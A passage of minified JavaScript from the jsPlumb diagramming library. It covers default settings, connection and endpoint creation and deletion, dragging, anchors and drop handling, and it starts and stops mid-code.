            Anchor: "Bottom",
            Anchors: [null, null],
            ConnectionsDetachable: !0,
            ConnectionOverlays: [],
            Connector: "Bezier",
            Container: null,
            DoNotThrowErrors: !1,
            DragOptions: {},
            DropOptions: {},
            Endpoint: "Dot",
            EndpointOverlays: [],
            Endpoints: [null, null],
            EndpointStyle: {fill: "#456"},
            EndpointStyles: [null, null],
            EndpointHoverStyle: null,
            EndpointHoverStyles: [null, null],
            HoverPaintStyle: null,
            LabelStyle: {color: "black"},
            LogEnabled: !1,
            Overlays: [],
            MaxConnections: 1,
            PaintStyle: {"stroke-width": 4, stroke: "#456"},
            ReattachConnections: !1,
            RenderMode: "svg",
            Scope: "jsPlumb_DefaultScope"
        }, d && p.extend(this.Defaults, d), this.logEnabled = this.Defaults.LogEnabled, this._connectionTypes = {}, this._endpointTypes = {}, b.EventGenerator.apply(this);
        var f = this, g = n(), h = f.bind, j = {}, l = 1, m = function (a) {
            if (null == a) return null;
            if (3 === a.nodeType || 8 === a.nodeType) return {el: a, text: !0};
            var c = f.getElement(a);
            return {el: c, id: b.isString(a) && null == c ? a : Y(c)}
        };
        this.getInstanceIndex = function () {
            return g
        }, this.setZoom = function (a, b) {
            return l = a, f.fire("zoom", l), b && f.repaintEverything(), !0
        }, this.getZoom = function () {
            return l
        };
        for (var o in this.Defaults) j[o] = this.Defaults[o];
        var q, r = [];
        this.unbindContainer = function () {
            if (null != q && r.length > 0) for (var a = 0; a < r.length; a++) f.off(q, r[a][0], r[a][1])
        }, this.setContainer = function (a) {
            this.unbindContainer(), a = this.getElement(a), this.select().each(function (b) {
                b.moveParent(a)
            }), this.selectEndpoints().each(function (b) {
                b.moveParent(a)
            });
            var b = q;
            q = a, r.length = 0;
            for (var c = {
                endpointclick: "endpointClick",
                endpointdblclick: "endpointDblClick"
            }, d = function (a, b, d) {
                var e = b.srcElement || b.target,
                    g = (e && e.parentNode ? e.parentNode._jsPlumb : null) || (e ? e._jsPlumb : null) || (e && e.parentNode && e.parentNode.parentNode ? e.parentNode.parentNode._jsPlumb : null);
                if (g) {
                    g.fire(a, g, b);
                    var h = d ? c[d + a] || a : a;
                    f.fire(h, g.component || g, b)
                }
            }, g = function (a, b, c) {
                r.push([a, c]), f.on(q, a, b, c)
            }, h = function (a) {
                g(a, ".jtk-connector", function (b) {
                    d(a, b)
                }), g(a, ".jtk-endpoint", function (b) {
                    d(a, b, "endpoint")
                }), g(a, ".jtk-overlay", function (b) {
                    d(a, b)
                })
            }, i = 0; i < e.length; i++) h(e[i]);
            for (var j in x) {
                var k = x[j].el;
                k.parentNode === b && (b.removeChild(k), q.appendChild(k))
            }
        }, this.getContainer = function () {
            return q
        }, this.bind = function (a, b) {
            "ready" === a && t ? b() : h.apply(f, [a, b])
        }, f.importDefaults = function (a) {
            for (var b in a) f.Defaults[b] = a[b];
            return a.Container && f.setContainer(a.Container), f
        }, f.restoreDefaults = function () {
            return f.Defaults = p.extend({}, j), f
        };
        var s = null, t = !1, u = [], v = {}, w = {}, x = {}, y = {}, z = {}, A = {}, B = !1, C = [], D = !1, E = null,
            F = this.Defaults.Scope, G = 1, H = function () {
                return "" + G++
            }, I = function (a, b) {
                q ? q.appendChild(a) : b ? this.getElement(b).appendChild(a) : this.appendToRoot(a)
            }.bind(this), J = function (a, b, d, e) {
                if (!D) {
                    var g, h = Y(a), i = f.getDragManager();
                    i && (g = i.getElementsForDraggable(h)), null == d && (d = c());
                    var j = ra({elId: h, offset: b, recalc: !1, timestamp: d});
                    if (g && j && j.o) for (var k in g) ra({
                        elId: g[k].id,
                        offset: {left: j.o.left + g[k].offset.left, top: j.o.top + g[k].offset.top},
                        recalc: !1,
                        timestamp: d
                    });
                    if (f.anchorManager.redraw(h, b, d, null, e), g) for (var l in g) f.anchorManager.redraw(g[l].id, b, d, g[l].offset, e, !0)
                }
            }, K = function (a) {
                return w[a]
            }, L = function (a, c, d, e, g) {
                if (!p.headless) {
                    if (null != c && c && p.isDragSupported(a, f)) {
                        var h = d || f.Defaults.DragOptions;
                        if (h = p.extend({}, h), p.isAlreadyDraggable(a, f)) d.force && f.initDraggable(a, h); else {
                            var i = p.dragEvents.drag, j = p.dragEvents.stop, k = p.dragEvents.start, l = !1;
                            qa(e, a), h[k] = b.wrap(h[k], function () {
                                if (f.setHoverSuspended(!0), f.select({source: a}).addClass(f.elementDraggingClass + " " + f.sourceElementDraggingClass, !0), f.select({target: a}).addClass(f.elementDraggingClass + " " + f.targetElementDraggingClass, !0), f.setConnectionBeingDragged(!0), h.canDrag) return d.canDrag()
                            }, !1), h[i] = b.wrap(h[i], function () {
                                var b = f.getUIPosition(arguments, f.getZoom());
                                null != b && (J(a, b, null, !0), l && f.addClass(a, "jtk-dragged"), l = !0)
                            }), h[j] = b.wrap(h[j], function () {
                                for (var a, b = arguments[0].selection, c = function (b) {
                                    null != b[1] && (a = f.getUIPosition([{
                                        el: b[2].el,
                                        pos: [b[1].left, b[1].top]
                                    }]), J(b[2].el, a)), f.removeClass(b[0], "jtk-dragged"), f.select({source: b[2].el}).removeClass(f.elementDraggingClass + " " + f.sourceElementDraggingClass, !0), f.select({target: b[2].el}).removeClass(f.elementDraggingClass + " " + f.targetElementDraggingClass, !0), f.getDragManager().dragEnded(b[2].el)
                                }, d = 0; d < b.length; d++) c(b[d]);
                                l = !1, f.setHoverSuspended(!1), f.setConnectionBeingDragged(!1)
                            });
                            var m = Y(a);
                            A[m] = !0;
                            var n = A[m];
                            h.disabled = null != n && !n, f.initDraggable(a, h), f.getDragManager().register(a), g && f.fire("elementDraggable", {
                                el: a,
                                options: h
                            })
                        }
                    }
                }
            }, M = function (a, b) {
                for (var c = a.scope.split(/\s/), d = b.scope.split(/\s/), e = 0; e < c.length; e++) for (var f = 0; f < d.length; f++) if (d[f] === c[e]) return !0;
                return !1
            }, N = function (a, b) {
                var c = p.extend({}, a);
                for (var d in b) b[d] && (c[d] = b[d]);
                return c
            }, O = function (a, c) {
                var d = p.extend({}, a);
                if (c && p.extend(d, c), d.source && (d.source.endpoint ? d.sourceEndpoint = d.source : d.source = f.getElement(d.source)), d.target && (d.target.endpoint ? d.targetEndpoint = d.target : d.target = f.getElement(d.target)), a.uuids && (d.sourceEndpoint = K(a.uuids[0]), d.targetEndpoint = K(a.uuids[1])), d.sourceEndpoint && d.sourceEndpoint.isFull()) return void b.log(f, "could not add connection; source endpoint is full");
                if (d.targetEndpoint && d.targetEndpoint.isFull()) return void b.log(f, "could not add connection; target endpoint is full");
                if (!d.type && d.sourceEndpoint && (d.type = d.sourceEndpoint.connectionType), d.sourceEndpoint && d.sourceEndpoint.connectorOverlays) {
                    d.overlays = d.overlays || [];
                    for (var e = 0, g = d.sourceEndpoint.connectorOverlays.length; e < g; e++) d.overlays.push(d.sourceEndpoint.connectorOverlays[e])
                }
                d.sourceEndpoint && d.sourceEndpoint.scope && (d.scope = d.sourceEndpoint.scope), !d["pointer-events"] && d.sourceEndpoint && d.sourceEndpoint.connectorPointerEvents && (d["pointer-events"] = d.sourceEndpoint.connectorPointerEvents);
                var h = function (a, b, c) {
                    return f.addEndpoint(a, N(b, {
                        anchor: d.anchors ? d.anchors[c] : d.anchor,
                        endpoint: d.endpoints ? d.endpoints[c] : d.endpoint,
                        paintStyle: d.endpointStyles ? d.endpointStyles[c] : d.endpointStyle,
                        hoverPaintStyle: d.endpointHoverStyles ? d.endpointHoverStyles[c] : d.endpointHoverStyle
                    }))
                }, i = function (a, b, c, e) {
                    if (d[a] && !d[a].endpoint && !d[a + "Endpoint"] && !d.newConnection) {
                        var f = Y(d[a]), g = c[f];
                        if (g = g ? g[e] : null) {
                            if (!g.enabled) return !1;
                            var i = null != g.endpoint && g.endpoint._jsPlumb ? g.endpoint : h(d[a], g.def, b);
                            if (i.isFull()) return !1;
                            d[a + "Endpoint"] = i, !d.scope && g.def.scope && (d.scope = g.def.scope), g.uniqueEndpoint ? g.endpoint ? i.finalEndpoint = g.endpoint : (g.endpoint = i, i.setDeleteOnEmpty(!1)) : i.setDeleteOnEmpty(!0), 0 === b && g.def.connectorOverlays && (d.overlays = d.overlays || [], Array.prototype.push.apply(d.overlays, g.def.connectorOverlays))
                        }
                    }
                };
                return !1 !== i("source", 0, this.sourceEndpointDefinitions, d.type || "default") && !1 !== i("target", 1, this.targetEndpointDefinitions, d.type || "default") ? (d.sourceEndpoint && d.targetEndpoint && (M(d.sourceEndpoint, d.targetEndpoint) || (d = null)), d) : void 0
            }.bind(f), P = function (a) {
                var b = f.Defaults.ConnectionType || f.getDefaultConnectionType();
                a._jsPlumb = f, a.newConnection = P, a.newEndpoint = R, a.endpointsByUUID = w, a.endpointsByElement = v, a.finaliseConnection = Q, a.id = "con_" + H();
                var c = new b(a);
                return c.isDetachable() && (c.endpoints[0].initDraggable("_jsPlumbSource"), c.endpoints[1].initDraggable("_jsPlumbTarget")), c
            }, Q = f.finaliseConnection = function (a, b, c, d) {
                if (b = b || {}, a.suspendedEndpoint || u.push(a), a.pending = null, a.endpoints[0].isTemporarySource = !1, !1 !== d && f.anchorManager.newConnection(a), J(a.source), !b.doNotFireConnectionEvent && !1 !== b.fireEvent) {
                    var e = {
                        connection: a,
                        source: a.source,
                        target: a.target,
                        sourceId: a.sourceId,
                        targetId: a.targetId,
                        sourceEndpoint: a.endpoints[0],
                        targetEndpoint: a.endpoints[1]
                    };
                    f.fire("connection", e, c)
                }
            }, R = function (a, b) {
                var c = f.Defaults.EndpointType || p.Endpoint, d = p.extend({}, a);
                d._jsPlumb = f, d.newConnection = P, d.newEndpoint = R, d.endpointsByUUID = w, d.endpointsByElement = v, d.fireDetachEvent = _, d.elementId = b || Y(d.source);
                var e = new c(d);
                return e.id = "ep_" + H(), qa(d.elementId, d.source), p.headless || f.getDragManager().endpointAdded(d.source, b), e
            }, S = function (a, b, c) {
                var d = v[a];
                if (d && d.length) for (var e = 0, f = d.length; e < f; e++) {
                    for (var g = 0, h = d[e].connections.length; g < h; g++) {
                        var i = b(d[e].connections[g]);
                        if (i) return
                    }
                    c && c(d[e])
                }
            }, T = function (a, b) {
                return p.each(a, function (a) {
                    f.isDragSupported(a) && (A[f.getAttribute(a, "id")] = b, f.setElementDraggable(a, b))
                })
            }, U = function (a, b, c) {
                b = "block" === b;
                var d = null;
                c && (d = function (a) {
                    a.setVisible(b, !0, !0)
                });
                var e = m(a);
                S(e.id, function (a) {
                    if (b && c) {
                        var d = a.sourceId === e.id ? 1 : 0;
                        a.endpoints[d].isVisible() && a.setVisible(!0)
                    } else a.setVisible(b)
                }, d)
            }, V = function (a) {
                var b;
                return p.each(a, function (a) {
                    var c = f.getAttribute(a, "id");
                    return b = null != A[c] && A[c], b = !b, A[c] = b, f.setDraggable(a, b), b
                }.bind(this)), b
            }, W = function (a, b) {
                var c = null;
                b && (c = function (a) {
                    var b = a.isVisible();
                    a.setVisible(!b)
                }), S(a, function (a) {
                    var b = a.isVisible();
                    a.setVisible(!b)
                }, c)
            }, X = function (a) {
                var b = y[a];
                return b ? {o: b, s: C[a]} : ra({elId: a})
            }, Y = function (a, c, d) {
                if (b.isString(a)) return a;
                if (null == a) return null;
                var e = f.getAttribute(a, "id");
                return e && "undefined" !== e || (2 === arguments.length && void 0 !== arguments[1] ? e = c : (1 === arguments.length || 3 === arguments.length && !arguments[2]) && (e = "jsPlumb_" + g + "_" + H()), d || f.setAttribute(a, "id", e)), e
            };
        this.setConnectionBeingDragged = function (a) {
            B = a
        }, this.isConnectionBeingDragged = function () {
            return B
        }, this.getManagedElements = function () {
            return x
        }, this.connectorClass = "jtk-connector", this.connectorOutlineClass = "jtk-connector-outline", this.connectedClass = "jtk-connected", this.hoverClass = "jtk-hover", this.endpointClass = "jtk-endpoint", this.endpointConnectedClass = "jtk-endpoint-connected", this.endpointFullClass = "jtk-endpoint-full", this.endpointDropAllowedClass = "jtk-endpoint-drop-allowed", this.endpointDropForbiddenClass = "jtk-endpoint-drop-forbidden", this.overlayClass = "jtk-overlay", this.draggingClass = "jtk-dragging", this.elementDraggingClass = "jtk-element-dragging", this.sourceElementDraggingClass = "jtk-source-element-dragging", this.targetElementDraggingClass = "jtk-target-element-dragging", this.endpointAnchorClassPrefix = "jtk-endpoint-anchor", this.hoverSourceClass = "jtk-source-hover", this.hoverTargetClass = "jtk-target-hover", this.dragSelectClass = "jtk-drag-select", this.Anchors = {}, this.Connectors = {svg: {}}, this.Endpoints = {svg: {}}, this.Overlays = {svg: {}}, this.ConnectorRenderers = {}, this.SVG = "svg", this.addEndpoint = function (a, c, d) {
            d = d || {};
            var e = p.extend({}, d);
            p.extend(e, c), e.endpoint = e.endpoint || f.Defaults.Endpoint, e.paintStyle = e.paintStyle || f.Defaults.EndpointStyle;
            for (var g = [], h = b.isArray(a) || null != a.length && !b.isString(a) ? a : [a], i = 0, j = h.length; i < j; i++) {
                e.source = f.getElement(h[i]), oa(e.source);
                var k = Y(e.source), l = R(e, k), m = qa(k, e.source).info.o;
                b.addToList(v, k, l), D || l.paint({
                    anchorLoc: l.anchor.compute({
                        xy: [m.left, m.top],
                        wh: C[k],
                        element: l,
                        timestamp: E
                    }), timestamp: E
                }), g.push(l)
            }
            return 1 === g.length ? g[0] : g
        }, this.addEndpoints = function (a, c, d) {
            for (var e = [], g = 0, h = c.length; g < h; g++) {
                var i = f.addEndpoint(a, c[g], d);
                b.isArray(i) ? Array.prototype.push.apply(e, i) : e.push(i)
            }
            return e
        }, this.animate = function (a, c, d) {
            if (!this.animationSupported) return !1;
            d = d || {};
            var e = f.getElement(a), g = Y(e), h = p.animEvents.step, i = p.animEvents.complete;
            d[h] = b.wrap(d[h], function () {
                f.revalidate(g)
            }), d[i] = b.wrap(d[i], function () {
                f.revalidate(g)
            }), f.doAnimate(e, c, d)
        }, this.checkCondition = function (a, c) {
            var d = f.getListener(a), e = !0;
            if (d && d.length > 0) {
                var g = Array.prototype.slice.call(arguments, 1);
                try {
                    for (var h = 0, i = d.length; h < i; h++) e = e && d[h].apply(d[h], g)
                } catch (c) {
                    b.log(f, "cannot check condition [" + a + "]" + c)
                }
            }
            return e
        }, this.connect = function (a, c) {
            var d, e = O(a, c);
            if (e) {
                if (null == e.source && null == e.sourceEndpoint) return void b.log("Cannot establish connection - source does not exist");
                if (null == e.target && null == e.targetEndpoint) return void b.log("Cannot establish connection - target does not exist");
                oa(e.source), d = P(e), Q(d, e)
            }
            return d
        };
        var Z = [{el: "source", elId: "sourceId", epDefs: "sourceEndpointDefinitions"}, {
            el: "target",
            elId: "targetId",
            epDefs: "targetEndpointDefinitions"
        }], $ = function (a, b, c, d) {
            var e, f, g, h = Z[c], i = a[h.elId], j = (a[h.el], a.endpoints[c]), k = {
                index: c,
                originalSourceId: 0 === c ? i : a.sourceId,
                newSourceId: a.sourceId,
                originalTargetId: 1 === c ? i : a.targetId,
                newTargetId: a.targetId,
                connection: a
            };
            if (b.constructor === p.Endpoint) e = b, e.addConnection(a), b = e.element; else if (f = Y(b), g = this[h.epDefs][f], f === a[h.elId]) e = null; else if (g) for (var l in g) {
                if (!g[l].enabled) return;
                e = null != g[l].endpoint && g[l].endpoint._jsPlumb ? g[l].endpoint : this.addEndpoint(b, g[l].def), g[l].uniqueEndpoint && (g[l].endpoint = e), e.addConnection(a)
            } else e = a.makeEndpoint(0 === c, b, f);
            return null != e && (j.detachFromConnection(a), a.endpoints[c] = e, a[h.el] = e.element, a[h.elId] = e.elementId, k[0 === c ? "newSourceId" : "newTargetId"] = e.elementId, aa(k), d || a.repaint()), k.element = b, k
        }.bind(this);
        this.setSource = function (a, b, c) {
            var d = $(a, b, 0, c);
            this.anchorManager.sourceChanged(d.originalSourceId, d.newSourceId, a, d.el)
        }, this.setTarget = function (a, b, c) {
            var d = $(a, b, 1, c);
            this.anchorManager.updateOtherEndpoint(d.originalSourceId, d.originalTargetId, d.newTargetId, a)
        }, this.deleteEndpoint = function (a, b, c) {
            var d = "string" == typeof a ? w[a] : a;
            return d && f.deleteObject({endpoint: d, dontUpdateHover: b, deleteAttachedObjects: c}), f
        }, this.deleteEveryEndpoint = function () {
            var a = f.setSuspendDrawing(!0);
            for (var b in v) {
                var c = v[b];
                if (c && c.length) for (var d = 0, e = c.length; d < e; d++) f.deleteEndpoint(c[d], !0)
            }
            v = {}, x = {}, w = {}, y = {}, z = {}, f.anchorManager.reset();
            var g = f.getDragManager();
            return g && g.reset(), a || f.setSuspendDrawing(!1), f
        };
        var _ = function (a, b, c) {
            var d = f.Defaults.ConnectionType || f.getDefaultConnectionType(), e = a.constructor === d, g = e ? {
                connection: a,
                source: a.source,
                target: a.target,
                sourceId: a.sourceId,
                targetId: a.targetId,
                sourceEndpoint: a.endpoints[0],
                targetEndpoint: a.endpoints[1]
            } : a;
            b && f.fire("connectionDetached", g, c), f.fire("internal.connectionDetached", g, c), f.anchorManager.connectionDetached(g)
        }, aa = f.fireMoveEvent = function (a, b) {
            f.fire("connectionMoved", a, b)
        };
        this.unregisterEndpoint = function (a) {
            a._jsPlumb.uuid && (w[a._jsPlumb.uuid] = null), f.anchorManager.deleteEndpoint(a);
            for (var b in v) {
                var c = v[b];
                if (c) {
                    for (var d = [], e = 0, g = c.length; e < g; e++) c[e] !== a && d.push(c[e]);
                    v[b] = d
                }
                v[b].length < 1 && delete v[b]
            }
        };
        var ba = "isDetachAllowed";
        this.deleteConnection = function (a, c) {
            return !(null == a || (c = c || {}, !c.force && !b.functionChain(!0, !1, [[a.endpoints[0], ba, [a]], [a.endpoints[1], ba, [a]], [a, ba, [a]], [f, "checkCondition", ["beforeDetach", a]]])) || (a.setHover(!1), _(a, !a.pending && !1 !== c.fireEvent, c.originalEvent), a.endpoints[0].detachFromConnection(a), a.endpoints[1].detachFromConnection(a), b.removeWithFunction(u, function (b) {
                return a.id === b.id
            }), a.cleanup(), a.destroy(), 0))
        }, this.deleteEveryConnection = function (a) {
            a = a || {};
            var b = u.length, c = 0;
            return f.batch(function () {
                for (var d = 0; d < b; d++) c += f.deleteConnection(u[0], a) ? 1 : 0
            }), c
        }, this.deleteConnectionsForElement = function (a, b) {
            b = b || {}, a = f.getElement(a);
            var c = Y(a), d = v[c];
            if (d && d.length) for (var e = 0, g = d.length; e < g; e++) d[e].deleteEveryConnection(b);
            return f
        }, this.deleteObject = function (a) {
            var c = {endpoints: {}, connections: {}, endpointCount: 0, connectionCount: 0},
                d = !1 !== a.deleteAttachedObjects, e = function (b) {
                    null != b && null == c.connections[b.id] && (a.dontUpdateHover || null == b._jsPlumb || b.setHover(!1), c.connections[b.id] = b, c.connectionCount++)
                }, g = function (b) {
                    if (null != b && null == c.endpoints[b.id] && (a.dontUpdateHover || null == b._jsPlumb || b.setHover(!1), c.endpoints[b.id] = b, c.endpointCount++, d)) for (var f = 0; f < b.connections.length; f++) {
                        var g = b.connections[f];
                        e(g)
                    }
                };
            a.connection ? e(a.connection) : g(a.endpoint);
            for (var h in c.connections) {
                var i = c.connections[h];
                if (i._jsPlumb) {
                    b.removeWithFunction(u, function (a) {
                        return i.id === a.id
                    }), _(i, !1 !== a.fireEvent && !i.pending, a.originalEvent);
                    var j = null == a.deleteAttachedObjects ? null : !a.deleteAttachedObjects;
                    i.endpoints[0].detachFromConnection(i, null, j), i.endpoints[1].detachFromConnection(i, null, j), i.cleanup(!0), i.destroy(!0)
                }
            }
            for (var k in c.endpoints) {
                var l = c.endpoints[k];
                l._jsPlumb && (f.unregisterEndpoint(l), l.cleanup(!0), l.destroy(!0))
            }
            return c
        }, this.draggable = function (a, b) {
            var c;
            return i(function (a) {
                c = m(a), c.el && L(c.el, !0, b, c.id, !0)
            }, a), f
        }, this.droppable = function (a, b) {
            var c;
            return b = b || {}, b.allowLoopback = !1, i(function (a) {
                c = m(a), c.el && f.initDroppable(c.el, b)
            }, a), f
        };
        var ca = function (a, b, c, d) {
            for (var e = 0, f = a.length; e < f; e++) a[e][b].apply(a[e], c);
            return d(a)
        }, da = function (a, b, c) {
            for (var d = [], e = 0, f = a.length; e < f; e++) d.push([a[e][b].apply(a[e], c), a[e]]);
            return d
        }, ea = function (a, b, c) {
            return function () {
                return ca(a, b, arguments, c)
            }
        }, fa = function (a, b) {
            return function () {
                return da(a, b, arguments)
            }
        }, ga = function (a, b) {
            var c = [];
            if (a) if ("string" == typeof a) {
                if ("*" === a) return a;
                c.push(a)
            } else if (b) c = a; else if (a.length) for (var d = 0, e = a.length; d < e; d++) c.push(m(a[d]).id); else c.push(m(a).id);
            return c
        }, ha = function (a, b, c) {
            return "*" === a || (a.length > 0 ? -1 !== a.indexOf(b) : !c)
        };
        this.getConnections = function (a, b) {
            a ? a.constructor === String && (a = {scope: a}) : a = {};
            for (var c = a.scope || f.getDefaultScope(), d = ga(c, !0), e = ga(a.source), g = ga(a.target), h = !b && d.length > 1 ? {} : [], i = function (a, c) {
                if (!b && d.length > 1) {
                    var e = h[a];
                    null == e && (e = h[a] = []), e.push(c)
                } else h.push(c)
            }, j = 0, k = u.length; j < k; j++) {
                var l = u[j], m = l.proxies && l.proxies[0] ? l.proxies[0].originalEp.elementId : l.sourceId,
                    n = l.proxies && l.proxies[1] ? l.proxies[1].originalEp.elementId : l.targetId;
                ha(d, l.scope) && ha(e, m) && ha(g, n) && i(l.scope, l)
            }
            return h
        };
        var ia = function (a, b) {
            return function (c) {
                for (var d = 0, e = a.length; d < e; d++) c(a[d]);
                return b(a)
            }
        }, ja = function (a) {
            return function (b) {
                return a[b]
            }
        }, ka = function (a, b) {
            var c, d, e = {length: a.length, each: ia(a, b), get: ja(a)},
                f = ["setHover", "removeAllOverlays", "setLabel", "addClass", "addOverlay", "removeOverlay", "removeOverlays", "showOverlay", "hideOverlay", "showOverlays", "hideOverlays", "setPaintStyle", "setHoverPaintStyle", "setSuspendEvents", "setParameter", "setParameters", "setVisible", "repaint", "addType", "toggleType", "removeType", "removeClass", "setType", "bind", "unbind"],
                g = ["getLabel", "getOverlay", "isHover", "getParameter", "getParameters", "getPaintStyle", "getHoverPaintStyle", "isVisible", "hasType", "getType", "isSuspendEvents"];
            for (c = 0, d = f.length; c < d; c++) e[f[c]] = ea(a, f[c], b);
            for (c = 0, d = g.length; c < d; c++) e[g[c]] = fa(a, g[c]);
            return e
        }, la = function (a) {
            var b = ka(a, la);
            return p.extend(b, {
                setDetachable: ea(a, "setDetachable", la),
                setReattach: ea(a, "setReattach", la),
                setConnector: ea(a, "setConnector", la),
                delete: function () {
                    for (var b = 0, c = a.length; b < c; b++) f.deleteConnection(a[b])
                },
                isDetachable: fa(a, "isDetachable"),
                isReattach: fa(a, "isReattach")
            })
        }, ma = function (a) {
            var b = ka(a, ma);
            return p.extend(b, {
                setEnabled: ea(a, "setEnabled", ma),
                setAnchor: ea(a, "setAnchor", ma),
                isEnabled: fa(a, "isEnabled"),
                deleteEveryConnection: function () {
                    for (var b = 0, c = a.length; b < c; b++) a[b].deleteEveryConnection()
                },
                delete: function () {
                    for (var b = 0, c = a.length; b < c; b++) f.deleteEndpoint(a[b])
                }
            })
        };
        this.select = function (a) {
            return a = a || {}, a.scope = a.scope || "*", la(a.connections || f.getConnections(a, !0))
        }, this.selectEndpoints = function (a) {
            a = a || {}, a.scope = a.scope || "*";
            var b = !a.element && !a.source && !a.target, c = b ? "*" : ga(a.element), d = b ? "*" : ga(a.source),
                e = b ? "*" : ga(a.target), f = ga(a.scope, !0), g = [];
            for (var h in v) {
                var i = ha(c, h, !0), j = ha(d, h, !0), k = "*" !== d, l = ha(e, h, !0), m = "*" !== e;
                if (i || j || l) a:for (var n = 0, o = v[h].length; n < o; n++) {
                    var p = v[h][n];
                    if (ha(f, p.scope, !0)) {
                        var q = k && d.length > 0 && !p.isSource, r = m && e.length > 0 && !p.isTarget;
                        if (q || r) continue a;
                        g.push(p)
                    }
                }
            }
            return ma(g)
        }, this.getAllConnections = function () {
            return u
        }, this.getDefaultScope = function () {
            return F
        }, this.getEndpoint = K, this.getEndpoints = function (a) {
            return v[m(a).id] || []
        }, this.getDefaultEndpointType = function () {
            return p.Endpoint
        }, this.getDefaultConnectionType = function () {
            return p.Connection
        }, this.getId = Y, this.appendElement = I;
        var na = !1;
        this.isHoverSuspended = function () {
            return na
        }, this.setHoverSuspended = function (a) {
            na = a
        }, this.hide = function (a, b) {
            return U(a, "none", b), f
        }, this.idstamp = H;
        var oa = function (a) {
            if (!q && a) {
                var b = f.getElement(a);
                b.offsetParent && f.setContainer(b.offsetParent)
            }
        }, pa = function () {
            f.Defaults.Container && f.setContainer(f.Defaults.Container)
        }, qa = f.manage = function (a, b, c) {
            return x[a] || (x[a] = {el: b, endpoints: [], connections: []}, x[a].info = ra({
                elId: a,
                timestamp: E
            }), c || f.fire("manageElement", {id: a, info: x[a].info, el: b})), x[a]
        }, ra = function (a) {
            var b, c = a.timestamp, d = a.recalc, e = a.offset, g = a.elId;
            return D && !c && (c = E), !d && c && c === z[g] ? {
                o: a.offset || y[g],
                s: C[g]
            } : (d || !e && null == y[g] ? null != (b = x[g] ? x[g].el : null) && (C[g] = f.getSize(b), y[g] = f.getOffset(b), z[g] = c) : (y[g] = e || y[g], null == C[g] && null != (b = x[g].el) && (C[g] = f.getSize(b)), z[g] = c), y[g] && !y[g].right && (y[g].right = y[g].left + C[g][0], y[g].bottom = y[g].top + C[g][1], y[g].width = C[g][0], y[g].height = C[g][1], y[g].centerx = y[g].left + y[g].width / 2, y[g].centery = y[g].top + y[g].height / 2), {
                o: y[g],
                s: C[g]
            })
        };
        this.updateOffset = ra, this.init = function () {
            t || (pa(), f.anchorManager = new a.jsPlumb.AnchorManager({jsPlumbInstance: f}), t = !0, f.fire("ready", f))
        }.bind(this), this.log = s, this.jsPlumbUIComponent = k, this.makeAnchor = function () {
            var c, d = function (b, c) {
                if (a.jsPlumb.Anchors[b]) return new a.jsPlumb.Anchors[b](c);
                if (!f.Defaults.DoNotThrowErrors) throw{msg: "jsPlumb: unknown anchor type '" + b + "'"}
            };
            if (0 === arguments.length) return null;
            var e = arguments[0], g = arguments[1], h = (arguments[2], null);
            if (e.compute && e.getOrientation) return e;
            if ("string" == typeof e) h = d(arguments[0], {
                elementId: g,
                jsPlumbInstance: f
            }); else if (b.isArray(e)) if (b.isArray(e[0]) || b.isString(e[0])) 2 === e.length && b.isObject(e[1]) ? b.isString(e[0]) ? (c = a.jsPlumb.extend({
                elementId: g,
                jsPlumbInstance: f
            }, e[1]), h = d(e[0], c)) : (c = a.jsPlumb.extend({
                elementId: g,
                jsPlumbInstance: f,
                anchors: e[0]
            }, e[1]), h = new a.jsPlumb.DynamicAnchor(c)) : h = new p.DynamicAnchor({
                anchors: e,
                selector: null,
                elementId: g,
                jsPlumbInstance: f
            }); else {
                var i = {
                    x: e[0],
                    y: e[1],
                    orientation: e.length >= 4 ? [e[2], e[3]] : [0, 0],
                    offsets: e.length >= 6 ? [e[4], e[5]] : [0, 0],
                    elementId: g,
                    jsPlumbInstance: f,
                    cssClass: 7 === e.length ? e[6] : null
                };
                h = new a.jsPlumb.Anchor(i), h.clone = function () {
                    return new a.jsPlumb.Anchor(i)
                }
            }
            return h.id || (h.id = "anchor_" + H()), h
        }, this.makeAnchors = function (c, d, e) {
            for (var g = [], h = 0, i = c.length; h < i; h++) "string" == typeof c[h] ? g.push(a.jsPlumb.Anchors[c[h]]({
                elementId: d,
                jsPlumbInstance: e
            })) : b.isArray(c[h]) && g.push(f.makeAnchor(c[h], d, e));
            return g
        }, this.makeDynamicAnchor = function (b, c) {
            return new a.jsPlumb.DynamicAnchor({anchors: b, selector: c, elementId: null, jsPlumbInstance: f})
        }, this.targetEndpointDefinitions = {}, this.sourceEndpointDefinitions = {};
        var sa = function (a, b, c, d, e) {
            for (var f = a.target || a.srcElement, g = !1, h = d.getSelector(b, c), i = 0; i < h.length; i++) if (h[i] === f) {
                g = !0;
                break
            }
            return e ? !g : g
        }, ta = function (c, d, e, g, h) {
            var i = new k(d), j = d._jsPlumb.EndpointDropHandler({
                jsPlumb: f, enabled: function () {
                    return c.def.enabled
                }, isFull: function () {
                    var a = f.select({target: c.id}).length;
                    return c.def.maxConnections > 0 && a >= c.def.maxConnections
                }, element: c.el, elementId: c.id, isSource: g, isTarget: h, addClass: function (a) {
                    f.addClass(c.el, a)
                }, removeClass: function (a) {
                    f.removeClass(c.el, a)
                }, onDrop: function (a) {
                    a.endpoints[0].anchor.unlock()
                }, isDropAllowed: function () {
                    return i.isDropAllowed.apply(i, arguments)
                }, isRedrop: function (a) {
                    return null != a.suspendedElement && null != a.suspendedEndpoint && a.suspendedEndpoint.element === c.el
                }, getEndpoint: function (b) {
                    var e = c.def.endpoint;
                    if (null == e || null == e._jsPlumb) {
                        var g = f.deriveEndpointAndAnchorSpec(b.getType().join(" "), !0),
                            h = g.endpoints ? a.jsPlumb.extend(d, {endpoint: c.def.def.endpoint || g.endpoints[1]}) : d;
                        g.anchors && (h = a.jsPlumb.extend(h, {anchor: c.def.def.anchor || g.anchors[1]})), e = f.addEndpoint(c.el, h), e._mtNew = !0
                    }
                    if (d.uniqueEndpoint && (c.def.endpoint = e), e.setDeleteOnEmpty(!0), b.isDetachable() && e.initDraggable(), null != e.anchor.positionFinder) {
                        var i = f.getUIPosition(arguments, f.getZoom()), j = f.getOffset(c.el), k = f.getSize(c.el),
                            l = null == i ? [0, 0] : e.anchor.positionFinder(i, j, k, e.anchor.constructorParams);
                        e.anchor.x = l[0], e.anchor.y = l[1]
                    }
                    return e
                }, maybeCleanup: function (a) {
                    a._mtNew && 0 === a.connections.length ? f.deleteObject({endpoint: a}) : delete a._mtNew
                }
            }), l = a.jsPlumb.dragEvents.drop;
